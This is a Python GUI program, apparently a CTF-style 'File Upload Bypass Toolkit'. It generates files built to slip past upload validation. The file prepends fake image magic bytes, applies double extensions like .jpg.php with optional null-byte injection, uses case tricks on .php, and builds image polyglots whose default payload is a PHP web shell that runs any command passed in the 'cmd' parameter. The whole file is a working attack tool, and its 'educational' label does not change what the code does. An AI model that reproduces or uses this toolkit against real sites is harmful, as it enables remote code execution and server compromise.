import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import os

class MagicBypassTool:
    def __init__(self, root):
        self.root = root
        self.root.title("0days | File Upload Bypass Toolkit")
        self.root.geometry("800x700")
        self.root.resizable(True, True)
        self.root.minsize(750, 650)
        
        # Purple aesthetic colors
        self.bg_dark = "#1a0a2e"
        self.bg_medium = "#2d1b4e"
        self.purple_accent = "#7b2cbf"
        self.purple_light = "#9d4edd"
        self.text_color = "#e0aaff"
        self.white = "#ffffff"
        self.hover_color = "#c77dff"
        
        self.root.configure(bg=self.bg_dark)
        
        # Magic number signatures
        self.magic_numbers = {
            "PNG": b"\x89PNG\r\n\x1a\n",
            "JPEG": b"\xff\xd8\xff\xe0",
            "GIF87a": b"GIF87a",
            "GIF89a": b"GIF89a",
            "PDF": b"%PDF-",
            "ZIP": b"PK\x03\x04",
            "DOCX": b"PK\x03\x04",
            "BMP": b"BM",
            "WebP": b"RIFF",
            "ICO": b"\x00\x00\x01\x00",
        }
        
        # Double extension patterns
        self.double_extensions = [
            ".jpg.php", ".png.php", ".gif.php", ".pdf.php",
            ".txt.php", ".doc.php", ".jpg.asp", ".png.jsp", 
            ".gif.phtml", ".jpeg.php5", ".png.phar"
        ]
        
        self.selected_file = None
        self.setup_ui()
    
    def setup_ui(self):
        # Header with 0days branding
        header_frame = tk.Frame(self.root, bg=self.bg_medium, height=100)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        # Logo/Title
        title_container = tk.Frame(header_frame, bg=self.bg_medium)
        title_container.place(relx=0.5, rely=0.5, anchor="center")
        
        title_label = tk.Label(
            title_container,
            text="0days",
            font=("Courier New", 36, "bold"),
            bg=self.bg_medium,
            fg=self.purple_light
        )
        title_label.pack()
        
        subtitle = tk.Label(
            title_container,
            text="━━━ FILE UPLOAD BYPASS TOOLKIT ━━━",
            font=("Courier New", 9),
            bg=self.bg_medium,
            fg=self.text_color
        )
        subtitle.pack()
        
        # Main container with padding
        container = tk.Frame(self.root, bg=self.bg_dark)
        container.pack(fill=tk.BOTH, expand=True, padx=20, pady=15)
        
        # File selection bar (persistent across all tabs)
        self.create_file_selection_bar(container)
        
        # Create notebook for tabs
        self.setup_notebook(container)
        
        # Footer
        footer_frame = tk.Frame(self.root, bg=self.bg_dark, height=40)
        footer_frame.pack(fill=tk.X, side=tk.BOTTOM)
        footer_frame.pack_propagate(False)
        
        footer = tk.Label(
            footer_frame,
            text="⚡ CTF Tool | For Educational Purposes Only ⚡",
            font=("Courier New", 9),
            bg=self.bg_dark,
            fg=self.purple_accent
        )
        footer.pack(expand=True)
    
    def create_file_selection_bar(self, parent):
        """Create a persistent file selection bar"""
        file_bar = tk.Frame(parent, bg=self.bg_medium, bd=0)
        file_bar.pack(fill=tk.X, pady=(0, 15), ipady=10, ipadx=10)
        
        # Left side - Select button
        select_btn = tk.Button(
            file_bar,
            text="📁 SELECT FILE",
            command=self.select_file,
            font=("Courier New", 10, "bold"),
            bg=self.purple_accent,
            fg=self.white,
            activebackground=self.hover_color,
            activeforeground=self.white,
            bd=0,
            padx=25,
            pady=12,
            cursor="hand2",
            relief=tk.FLAT
        )
        select_btn.pack(side=tk.LEFT, padx=10)
        
        # Hover effect
        select_btn.bind("<Enter>", lambda e: select_btn.config(bg=self.hover_color))
        select_btn.bind("<Leave>", lambda e: select_btn.config(bg=self.purple_accent))
        
        # Right side - File label with frame
        label_frame = tk.Frame(file_bar, bg=self.bg_dark, bd=1, relief=tk.SOLID)
        label_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        
        self.file_label = tk.Label(
            label_frame,
            text="No file selected",
            font=("Courier New", 10),
            bg=self.bg_dark,
            fg=self.text_color,
            anchor="w",
            padx=15,
            pady=10
        )
        self.file_label.pack(fill=tk.BOTH, expand=True)
    
    def setup_notebook(self, parent):
        """Setup tabbed interface"""
        style = ttk.Style()
        style.theme_use('default')
        
        # Notebook style
        style.configure('Purple.TNotebook', 
                       background=self.bg_dark, 
                       borderwidth=0,
                       tabmargins=[5, 5, 5, 0])
        
        style.configure('Purple.TNotebook.Tab', 
                       background=self.bg_medium,
                       foreground=self.text_color,
                       padding=[25, 12],
                       font=('Courier New', 10, 'bold'),
                       borderwidth=0)
        
        style.map('Purple.TNotebook.Tab',
                 background=[('selected', self.purple_accent)],
                 foreground=[('selected', self.white)],
                 expand=[('selected', [1, 1, 1, 0])])
        
        self.notebook = ttk.Notebook(parent, style='Purple.TNotebook')
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create tabs
        self.magic_tab = tk.Frame(self.notebook, bg=self.bg_dark)
        self.extension_tab = tk.Frame(self.notebook, bg=self.bg_dark)
        self.polyglot_tab = tk.Frame(self.notebook, bg=self.bg_dark)
        self.case_tab = tk.Frame(self.notebook, bg=self.bg_dark)
        
        self.notebook.add(self.magic_tab, text='🎭 MAGIC BYTES')
        self.notebook.add(self.extension_tab, text='📝 EXTENSIONS')
        self.notebook.add(self.polyglot_tab, text='🖼️ POLYGLOTS')
        self.notebook.add(self.case_tab, text='🔤 CASE TRICKS')
        
        self.setup_magic_tab()
        self.setup_extension_tab()
        self.setup_polyglot_tab()
        self.setup_case_tab()
    
    def create_section_header(self, parent, text, subtext=""):
        """Create a styled section header"""
        header_frame = tk.Frame(parent, bg=self.bg_dark)
        header_frame.pack(fill=tk.X, pady=(15, 10))
        
        title = tk.Label(
            header_frame,
            text=text,
            font=("Courier New", 11, "bold"),
            bg=self.bg_dark,
            fg=self.purple_light,
            anchor="w"
        )
        title.pack(anchor="w")
        
        if subtext:
            subtitle = tk.Label(
                header_frame,
                text=subtext,
                font=("Courier New", 9),
                bg=self.bg_dark,
                fg=self.text_color,
                anchor="w",
                wraplength=700,
                justify=tk.LEFT
            )
            subtitle.pack(anchor="w", pady=(3, 0))
        
        return header_frame
    
    def create_styled_listbox(self, parent, items, height=8):
        """Create a styled listbox with scrollbar"""
        listbox_container = tk.Frame(parent, bg=self.purple_accent, bd=2, relief=tk.FLAT)
        listbox_container.pack(fill=tk.BOTH, expand=True, pady=(0, 15))
        
        scrollbar = tk.Scrollbar(listbox_container, bg=self.bg_medium, troughcolor=self.bg_dark)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        listbox = tk.Listbox(
            listbox_container,
            font=("Courier New", 10),
            bg=self.bg_dark,
            fg=self.text_color,
            selectbackground=self.purple_accent,
            selectforeground=self.white,
            bd=0,
            highlightthickness=0,
            yscrollcommand=scrollbar.set,
            height=height,
            activestyle='none'
        )
        listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=3, pady=3)
        scrollbar.config(command=listbox.yview)
        
        for item in items:
            listbox.insert(tk.END, f"  {item}")
        
        return listbox
    
    def create_action_button(self, parent, text, command, primary=True):
        """Create a styled action button"""
        btn_frame = tk.Frame(parent, bg=self.bg_dark)
        btn_frame.pack(fill=tk.X, pady=(10, 5))
        
        btn = tk.Button(
            btn_frame,
            text=text,
            command=command,
            font=("Courier New", 11, "bold"),
            bg=self.purple_light if primary else self.bg_medium,
            fg=self.white,
            activebackground=self.hover_color,
            activeforeground=self.white,
            bd=0,
            padx=30,
            pady=15,
            cursor="hand2",
            relief=tk.FLAT
        )
        btn.pack(fill=tk.X, ipady=2)
        
        # Hover effect
        hover_color = self.hover_color if primary else self.purple_accent
        original_color = self.purple_light if primary else self.bg_medium
        btn.bind("<Enter>", lambda e: btn.config(bg=hover_color))
        btn.bind("<Leave>", lambda e: btn.config(bg=original_color))
        
        return btn
    
    def setup_magic_tab(self):
        """Setup magic bytes tab"""
        content = tk.Frame(self.magic_tab, bg=self.bg_dark)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.create_section_header(
            content,
            "SELECT MAGIC NUMBER TO PREPEND",
            "Prepend file signatures to bypass MIME type validation"
        )
        
        self.magic_listbox = self.create_styled_listbox(
            content,
            list(self.magic_numbers.keys()),
            height=10
        )
        
        self.create_action_button(
            content,
            "🚀 GENERATE BYPASS FILE",
            self.generate_magic_bypass
        )
    
    def setup_extension_tab(self):
        """Setup extension bypass tab"""
        content = tk.Frame(self.extension_tab, bg=self.bg_dark)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.create_section_header(
            content,
            "DOUBLE EXTENSION BYPASS",
            "Exploit poor extension parsing with double extensions"
        )
        
        self.ext_listbox = self.create_styled_listbox(
            content,
            self.double_extensions,
            height=8
        )
        
        # Custom extension input
        custom_frame = tk.Frame(content, bg=self.bg_dark)
        custom_frame.pack(fill=tk.X, pady=(0, 10))
        
        custom_label = tk.Label(
            custom_frame,
            text="Custom Extension:",
            font=("Courier New", 10, "bold"),
            bg=self.bg_dark,
            fg=self.purple_light
        )
        custom_label.pack(anchor="w", pady=(0, 5))
        
        entry_container = tk.Frame(custom_frame, bg=self.purple_accent, bd=2)
        entry_container.pack(fill=tk.X)
        
        self.custom_ext_entry = tk.Entry(
            entry_container,
            font=("Courier New", 11),
            bg=self.bg_dark,
            fg=self.text_color,
            insertbackground=self.purple_light,
            bd=0
        )
        self.custom_ext_entry.pack(fill=tk.X, ipady=8, padx=3, pady=3)
        self.custom_ext_entry.insert(0, ".custom.php")
        
        # Null byte option
        self.null_byte_var = tk.BooleanVar()
        null_check = tk.Checkbutton(
            content,
            text="  Add null byte injection (\\x00)",
            variable=self.null_byte_var,
            font=("Courier New", 10),
            bg=self.bg_dark,
            fg=self.text_color,
            selectcolor=self.bg_medium,
            activebackground=self.bg_dark,
            activeforeground=self.purple_light,
            bd=0,
            highlightthickness=0
        )
        null_check.pack(anchor="w", pady=(10, 0))
        
        self.create_action_button(
            content,
            "🚀 RENAME WITH EXTENSION",
            self.generate_extension_bypass
        )
    
    def setup_polyglot_tab(self):
        """Setup polyglot file tab"""
        content = tk.Frame(self.polyglot_tab, bg=self.bg_dark)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.create_section_header(
            content,
            "POLYGLOT FILE GENERATION",
            "Create valid images with embedded executable payloads"
        )
        
        # Payload input
        payload_label = tk.Label(
            content,
            text="Payload Code:",
            font=("Courier New", 10, "bold"),
            bg=self.bg_dark,
            fg=self.purple_light
        )
        payload_label.pack(anchor="w", pady=(5, 5))
        
        text_container = tk.Frame(content, bg=self.purple_accent, bd=2)
        text_container.pack(fill=tk.BOTH, expand=True, pady=(0, 15))
        
        # Scrollbar for text
        text_scroll = tk.Scrollbar(text_container)
        text_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.payload_text = tk.Text(
            text_container,
            font=("Courier New", 10),
            bg=self.bg_dark,
            fg=self.text_color,
            insertbackground=self.purple_light,
            bd=0,
            height=6,
            wrap=tk.WORD,
            yscrollcommand=text_scroll.set
        )
        self.payload_text.pack(fill=tk.BOTH, expand=True, padx=3, pady=3)
        text_scroll.config(command=self.payload_text.yview)
        self.payload_text.insert("1.0", "<?php system($_GET['cmd']); ?>")
        
        # Image type selection
        type_label = tk.Label(
            content,
            text="Image Format:",
            font=("Courier New", 10, "bold"),
            bg=self.bg_dark,
            fg=self.purple_light
        )
        type_label.pack(anchor="w", pady=(10, 8))
        
        self.polyglot_var = tk.StringVar(value="GIF")
        type_frame = tk.Frame(content, bg=self.bg_dark)
        type_frame.pack(anchor="w", pady=(0, 5))
        
        for img_type in ["GIF", "JPEG", "PNG"]:
            rb = tk.Radiobutton(
                type_frame,
                text=f"  {img_type}",
                variable=self.polyglot_var,
                value=img_type,
                font=("Courier New", 10),
                bg=self.bg_dark,
                fg=self.text_color,
                selectcolor=self.bg_medium,
                activebackground=self.bg_dark,
                activeforeground=self.purple_light,
                bd=0,
                highlightthickness=0
            )
            rb.pack(side=tk.LEFT, padx=(0, 20))
        
        self.create_action_button(
            content,
            "🚀 CREATE POLYGLOT FILE",
            self.generate_polyglot
        )
    
    def setup_case_tab(self):
        """Setup case manipulation tab"""
        content = tk.Frame(self.case_tab, bg=self.bg_dark)
        content.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.create_section_header(
            content,
            "CASE MANIPULATION BYPASS",
            "Alter extension capitalization to evade case-sensitive filters"
        )
        
        # Current filename display
        info_container = tk.Frame(content, bg=self.bg_medium, bd=0)
        info_container.pack(fill=tk.X, pady=(0, 15), ipady=10, ipadx=15)
        
        info_label = tk.Label(
            info_container,
            text="Current File:",
            font=("Courier New", 9, "bold"),
            bg=self.bg_medium,
            fg=self.purple_light
        )
        info_label.pack(anchor="w")
        
        self.case_original_label = tk.Label(
            info_container,
            text="(select a file first)",
            font=("Courier New", 10),
            bg=self.bg_medium,
            fg=self.text_color,
            anchor="w"
        )
        self.case_original_label.pack(anchor="w", pady=(3, 0))
        
        # Case manipulation options
        options_label = tk.Label(
            content,
            text="Select Case Pattern:",
            font=("Courier New", 10, "bold"),
            bg=self.bg_dark,
            fg=self.purple_light
        )
        options_label.pack(anchor="w", pady=(10, 8))
        
        options_container = tk.Frame(content, bg=self.bg_dark)
        options_container.pack(fill=tk.BOTH, expand=True)
        
        self.case_options = [
            ("Uppercase Extension", ".PHP", "All uppercase"),
            ("Lowercase Extension", ".php", "All lowercase"),
            ("Mixed Case #1", ".pHp", "Alternating case"),
            ("Mixed Case #2", ".PhP", "Middle lowercase"),
            ("Mixed Case #3", ".PHp", "Last lowercase"),
            ("Double Extension", ".php.PHP", "Mixed double"),
            ("Reverse Case", ".Php", "First upper only"),
        ]
        
        for i, (desc, example, tooltip) in enumerate(self.case_options):
            btn = tk.Button(
                options_container,
                text=f"{desc}  →  {example}",
                command=lambda idx=i: self.apply_case_manipulation(idx),
                font=("Courier New", 10),
                bg=self.bg_medium,
                fg=self.text_color,
                activebackground=self.purple_accent,
                activeforeground=self.white,
                bd=0,
                padx=20,
                pady=12,
                cursor="hand2",
                anchor="w",
                relief=tk.FLAT
            )
            btn.pack(fill=tk.X, pady=3)
            
            # Hover effect
            btn.bind("<Enter>", lambda e, b=btn: b.config(bg=self.purple_accent, fg=self.white))
            btn.bind("<Leave>", lambda e, b=btn: b.config(bg=self.bg_medium, fg=self.text_color))
    
    def select_file(self):
        """Handle file selection"""
        filename = filedialog.askopenfilename(
            title="Select File to Bypass",
            filetypes=[("All Files", "*.*")]
        )
        if filename:
            self.selected_file = filename
            display_name = os.path.basename(filename)
            
            # Truncate long filenames
            if len(display_name) > 60:
                display_name = display_name[:57] + "..."
            
            self.file_label.config(text=f"✓ {display_name}")
            self.case_original_label.config(text=display_name)
    
    def generate_magic_bypass(self):
        """Generate file with magic number prepended"""
        if not self.selected_file:
            messagebox.showwarning("No File Selected", "Please select a file first!")
            return
        
        selection = self.magic_listbox.curselection()
        if not selection:
            messagebox.showwarning("No Magic Number", "Please select a magic number from the list!")
            return
        
        magic_type = self.magic_listbox.get(selection[0]).strip()
        magic_bytes = self.magic_numbers[magic_type]
        
        try:
            with open(self.selected_file, 'rb') as f:
                original_content = f.read()
            
            base_name = os.path.basename(self.selected_file)
            name, ext = os.path.splitext(base_name)
            output_file = filedialog.asksaveasfilename(
                title="Save Bypass File",
                initialfile=f"{name}_magic{ext}",
                defaultextension=ext,
                filetypes=[("All Files", "*.*")]
            )
            
            if output_file:
                with open(output_file, 'wb') as f:
                    f.write(magic_bytes + original_content)
                
                messagebox.showinfo(
                    "✓ Success!",
                    f"Magic number bypass created successfully!\n\n"
                    f"Type: {magic_type}\n"
                    f"File: {os.path.basename(output_file)}\n\n"
                    f"Ready for upload!"
                )
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create bypass file:\n\n{str(e)}")
    
    def generate_extension_bypass(self):
        """Generate file with modified extension"""
        if not self.selected_file:
            messagebox.showwarning("No File Selected", "Please select a file first!")
            return
        
        # Get selected or custom extension
        custom_ext = self.custom_ext_entry.get().strip()
        if custom_ext:
            new_ext = custom_ext if custom_ext.startswith('.') else f'.{custom_ext}'
        else:
            selection = self.ext_listbox.curselection()
            if not selection:
                messagebox.showwarning("No Extension", "Select an extension or enter a custom one!")
                return
            new_ext = self.ext_listbox.get(selection[0]).strip()
        
        # Add null byte if selected
        if self.null_byte_var.get():
            parts = new_ext.split('.')
            if len(parts) >= 2:
                new_ext = f".{parts[1]}\x00.{parts[2]}" if len(parts) > 2 else f"{new_ext}\x00"
        
        base_name = os.path.basename(self.selected_file)
        new_name = base_name + new_ext
        
        output_file = filedialog.asksaveasfilename(
            title="Save Renamed File",
            initialfile=new_name,
            filetypes=[("All Files", "*.*")]
        )
        
        if output_file:
            try:
                import shutil
                shutil.copy2(self.selected_file, output_file)
                
                null_msg = "\n(with null byte)" if self.null_byte_var.get() else ""
                messagebox.showinfo(
                    "✓ Success!",
                    f"Extension bypass created successfully!\n\n"
                    f"New filename: {os.path.basename(output_file)}{null_msg}\n\n"
                    f"Ready for upload!"
                )
            except Exception as e:
                messagebox.showerror("Error", f"Failed to create bypass file:\n\n{str(e)}")
    
    def generate_polyglot(self):
        """Generate polyglot file"""
        payload = self.payload_text.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showwarning("No Payload", "Please enter a payload!")
            return
        
        img_type = self.polyglot_var.get()
        
        # Create minimal valid image with payload
        if img_type == "GIF":
            content = b"GIF89a" + b"\x01\x00\x01\x00\x00\x00\x00" + b";" + payload.encode()
            ext = ".gif"
        elif img_type == "JPEG":
            content = b"\xff\xd8\xff\xe0\x00\x10JFIF" + payload.encode() + b"\xff\xd9"
            ext = ".jpg"
        else:  # PNG
            content = b"\x89PNG\r\n\x1a\n" + payload.encode()
            ext = ".png"
        
        output_file = filedialog.asksaveasfilename(
            title="Save Polyglot File",
            initialfile=f"polyglot{ext}",
            defaultextension=ext,
            filetypes=[("All Files", "*.*")]
        )
        
        if output_file:
            try:
                with open(output_file, 'wb') as f:
                    f.write(content)
                
                messagebox.showinfo(
                    "✓ Success!",
                    f"Polyglot file created successfully!\n\n"
                    f"Image Type: {img_type}\n"
                    f"File: {os.path.basename(output_file)}\n"
                    f"Payload Size: {len(payload)} bytes\n\n"
                    f"Ready for upload!"
                )
            except Exception as e:
                messagebox.showerror("Error", f"Failed to create polyglot:\n\n{str(e)}")
    
    def apply_case_manipulation(self, option_idx):
        """Apply case manipulation to filename"""
        if not self.selected_file:
            messagebox.showwarning("No File Selected", "Please select a file first!")
            return
        
        base_name = os.path.basename(self.selected_file)
        name, ext = os.path.splitext(base_name)
        
        # Apply case manipulation
        if option_idx == 0:  # Uppercase
            new_name = name + ext.upper()
        elif option_idx == 1:  # Lowercase
            new_name = name + ext.lower()
        elif option_idx == 2:  # Mixed 1
            new_name = name + ".pHp" if ext.lower() == ".php" else name + ext[0] + ext[1:].upper()[0] + ext[2:].lower()
        elif option_idx == 3:  # Mixed 2
            new_name = name + ".PhP" if ext.lower() == ".php" else name + ext[0].upper() + ext[1].lower() + ext[2:].upper()
        elif option_idx == 4:  # Mixed 3
            new_name = name + ".PHp" if ext.lower() == ".php" else name + ext[:2].upper() + ext[2:].lower()
        elif option_idx == 5:  # Double upper
            new_name = name + ext.lower() + ext.upper()
        else:  # Reverse
            new_name = name + ext[0].upper() + ext[1:].lower()
        
        output_file = filedialog.asksaveasfilename(
            title="Save File with New Case",
            initialfile=new_name,
            filetypes=[("All Files", "*.*")]
        )
        
        if output_file:
            try:
                import shutil
                shutil.copy2(self.selected_file, output_file)
                
                messagebox.showinfo(
                    "✓ Success!",
                    f"Case manipulation applied successfully!\n\n"
                    f"Original: {base_name}\n"
                    f"New: {os.path.basename(output_file)}\n\n"
                    f"Ready for upload!"
                )
            except Exception as e:
                messagebox.showerror("Error", f"Failed to apply case manipulation:\n\n{str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = MagicBypassTool(root)
    root.mainloop()
